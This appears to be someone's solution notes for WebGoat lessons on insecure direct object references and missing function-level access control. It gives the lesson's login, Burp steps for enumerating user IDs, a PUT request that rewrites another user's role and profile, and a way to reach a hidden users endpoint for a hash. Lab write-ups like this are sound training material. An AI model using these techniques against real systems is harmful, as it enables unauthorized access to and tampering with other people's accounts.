# Insecure Direct Object References
### 2
username: tom
password: cat

### 3
- Open Burp
- click View Profile
- send to responder
- view response

{
  "role" : 3,
  "color" : "yellow",
  "size" : "small",
  "name" : "Tom Cat",
  "userId" : "2342384"
}

### 4
guessing: WebGoat/IDOR/profile/2342384

### 5
Intruder - sniper;number
start from: 2342384
then intercept View Profile req and paste 2342388

change to PUT, add "Content-Type: application/json":
{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}

# Missing Function Level Access Control
### 2
Use inspect mode to find
<div class="menu-section hidden-menu-item ui-accordion-content ui-corner-bottom ui-helper-reset ui-widget-content" id="ui-id-6" aria-labelledby="ui-id-5" role="tabpanel" aria-hidden="true" style="display: none; height: 60px;">
	<ul>
		<li><a href="/users">Users</a></li>
		<li><a href="/config">Config</a></li>
	</ul>
</div>
Users
Config

### 3
- open Burp
- get some lessonmenu.mvc GET request
- change GET /WebGoat/users HTTP/1.1
- and add Content-Type: application/json
- you will get hash in response